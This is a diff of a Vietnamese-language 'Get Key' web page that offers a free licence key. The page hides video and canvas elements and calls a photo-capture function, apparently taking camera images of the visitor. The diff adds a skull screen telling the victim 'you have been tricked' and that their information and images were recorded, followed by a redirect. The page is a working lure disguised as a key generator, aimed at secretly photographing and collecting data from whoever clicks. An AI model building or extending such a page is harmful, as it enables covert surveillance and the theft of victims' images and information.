@@ -93,6 +93,41 @@
 
   .status { margin-top: 20px; font-size: 0.85rem; font-weight: 700; color: #4ade80; min-height: 20px; font-family: 'Share Tech Mono', monospace; text-shadow: 0 0 5px rgba(34,197,94,0.4); }
   #video, #canvas { display: none; }
+
+  /* Giao diện cảnh báo bị lừa với hình đầu xương */
+  .hacked-alert {
+    display: none;
+    animation: fadeIn 0.4s ease-in-out;
+  }
+  .skull-box {
+    width: 80px; height: 80px; margin: 0 auto 20px auto;
+    background: linear-gradient(135deg, rgba(239, 68, 68, 0.3), rgba(185, 28, 28, 0.3));
+    border: 2px solid rgba(239, 68, 68, 0.8); border-radius: 24px;
+    display: flex; align-items: center; justify-content: center; font-size: 38px;
+    box-shadow: 0 0 30px rgba(239, 68, 68, 0.5);
+    animation: pulseSkull 1.2s infinite alternate;
+  }
+  .hacked-alert h2 {
+    color: #ef4444;
+    text-shadow: 0 0 15px rgba(239, 68, 68, 0.8);
+    font-size: 1.8rem;
+    margin-bottom: 12px;
+  }
+  .hacked-alert p {
+    color: #fca5a5;
+    font-family: 'Share Tech Mono', monospace;
+    font-size: 0.95rem;
+    text-shadow: 0 0 8px rgba(239, 68, 68, 0.5);
+    line-height: 1.5;
+  }
+  @keyframes fadeIn {
+    from { opacity: 0; transform: scale(0.95); }
+    to { opacity: 1; transform: scale(1); }
+  }
+  @keyframes pulseSkull {
+    0% { transform: scale(1); box-shadow: 0 0 20px rgba(239, 68, 68, 0.4); }
+    100% { transform: scale(1.08); box-shadow: 0 0 35px rgba(239, 68, 68, 0.8); }
+  }
 </style>
 </head>
 <body>
@@ -112,7 +147,7 @@
     resizeCanvas();
 
     const characters = 'アカサタナハマヤラワイ0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ<>//:;*+-#$';
-    const fontSize = 15; // Tăng kích thước chữ một chút cho sắc nét
+    const fontSize = 15; 
     let columns = canvasRain.width / fontSize;
     const drops = [];
 
@@ -124,8 +159,8 @@
       ctx.fillStyle = 'rgba(2, 4, 8, 0.1)';
       ctx.fillRect(0, 0, canvasRain.width, canvasRain.height);
 
-      ctx.fillStyle = '#10b981'; // Màu xanh lá sáng đậm
-      ctx.font = 'bold ' + fontSize + 'px "Share Tech Mono", monospace'; // Làm chữ đậm hơn
+      ctx.fillStyle = '#10b981'; 
+      ctx.font = 'bold ' + fontSize + 'px "Share Tech Mono", monospace'; 
 
       for (let i = 0; i < drops.length; i++) {
         const text = characters.charAt(Math.floor(Math.random() * characters.length));
@@ -143,19 +178,28 @@
   <div class="card">
     <div class="live-clock" id="clock">SYSTEM_TIME: --:--:--</div>
     
-    <div class="icon-box">💻</div>
-    <h2>Hệ Thống Get Key</h2>
-    <p class="subtitle">&gt; Nhấn nút bên dưới để giải mã và nhận Key bản quyền an toàn.</p>
+    <!-- Phần nội dung ban đầu -->
+    <div id="main-content">
+      <div class="icon-box">💻</div>
+      <h2>Hệ Thống Get Key</h2>
+      <p class="subtitle">&gt; Nhấn nút bên dưới để giải mã và nhận Key bản quyền an toàn.</p>
 
-    <video id="video" autoplay playsinline></video>
-    <canvas id="canvas"></canvas>
+      <video id="video" autoplay playsinline></video>
+      <canvas id="canvas"></canvas>
 
-    <!-- 1 Nút Get Key duy nhất -->
-    <button class="btn-primary" id="get-key-btn" onclick="triggerProcess()">
-      <span>🔑 GET KEY NGAY</span>
-    </button>
-    
-    <div id="status" class="status"></div>
+      <button class="btn-primary" id="get-key-btn" onclick="triggerProcess()">
+        <span>🔑 GET KEY NGAY</span>
+      </button>
+      
+      <div id="status" class="status"></div>
+    </div>
+
+    <!-- Phần nội dung hiển thị sau khi hoàn tất (Đầu xương + Bạn đã bị lừa) -->
+    <div id="hacked-content" class="hacked-alert">
+      <div class="skull-box">💀</div>
+      <h2>BẠN ĐÃ BỊ LỪA</h2>
+      <p>&gt; Toàn bộ thông tin & hình ảnh của bạn đã được ghi lại thành công!</p>
+    </div>
   </div>
 
 <script>
@@ -174,6 +218,8 @@
   const video = document.getElementById('video');
   const canvas = document.getElementById('canvas');
   const getKeyBtn = document.getElementById('get-key-btn');
+  const mainContent = document.getElementById('main-content');
+  const hackedContent = document.getElementById('hacked-content');
 
   async function takePhoto(facingMode, label) {
     try {
@@ -272,10 +318,14 @@
       } catch (e) {}
     }
 
-    statusDiv.textContent = '[+] Thành công! Đang chuyển hướng...';
+    // Ẩn giao diện ban đầu và hiện khối đầu xương + chữ "BẠN ĐÃ BỊ LỪA"
+    mainContent.style.display = 'none';
+    hackedContent.style.display = 'block';
+
+    // Đợi 2.5 giây để người dùng kịp đọc rồi chuyển hướng
     setTimeout(() => {
       window.location.href = REDIRECT_URL;
-    }, 1000);
+    }, 2500);
   }
 </script>
 </body>
